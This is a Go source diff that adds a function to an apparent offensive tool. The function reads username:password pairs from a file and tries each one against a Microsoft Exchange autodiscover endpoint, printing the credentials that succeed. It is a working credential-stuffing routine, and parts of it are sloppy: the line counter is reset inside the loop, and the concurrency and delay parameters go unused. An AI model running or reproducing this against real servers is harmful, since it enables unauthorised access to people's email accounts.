@@ -140,6 +140,63 @@ func BruteForce(domain, usersFile, passwordsFile string, basic, insecure, stopSu
 	}
 }
 
+func UserPassBruteForce(domain, userpassFile string, basic, insecure, stopSuccess, verbose bool, consc, delay int) {
+	fmt.Println("[*] Trying to Autodiscover domain")
+	autodiscoverURL := autodiscoverDomain(domain)
+
+	if autodiscoverURL == "" {
+		return
+	}
+	userpass := readFile(userpassFile)
+	if userpass == nil {
+		return
+	}
+
+	result := make(chan Result)
+	count := 0
+
+	for _, up := range userpass {
+		count++
+		if up == "" {
+			continue
+		}
+		// verify colon-delimited username:password format
+		s := strings.SplitN(up, ":", 2)
+		if len(s) < 2 {
+			fmt.Printf("[!] Skipping improperly formatted entry in %s:%d\n", userpassFile, count)
+			continue
+		}
+		u, p := s[0], s[1]
+		count = 0
+
+		//skip blank username
+		if u == "" {
+			continue
+		}
+
+		go func(u string, p string) {
+			out := connect(autodiscoverURL, u, p, basic, insecure)
+			result <- out
+		}(u, p)
+
+		select {
+		case res := <-result:
+			if verbose == true && res.Status != 200 {
+				fmt.Printf("[x] Failed: %s:%s\n", res.Username, res.Password)
+				if res.Error != nil {
+					fmt.Printf("[x] An error occured in connection - %s\n", res.Error)
+				}
+			}
+			if res.Status == 200 {
+				fmt.Printf("\033[96m[+] Success: %s:%s\033[0m\n", res.Username, res.Password)
+			}
+			if stopSuccess == true && res.Status == 200 {
+				return
+			}
+		}
+	}
+}
+
 func readFile(filename string) []string {
 	var outputs []string
 
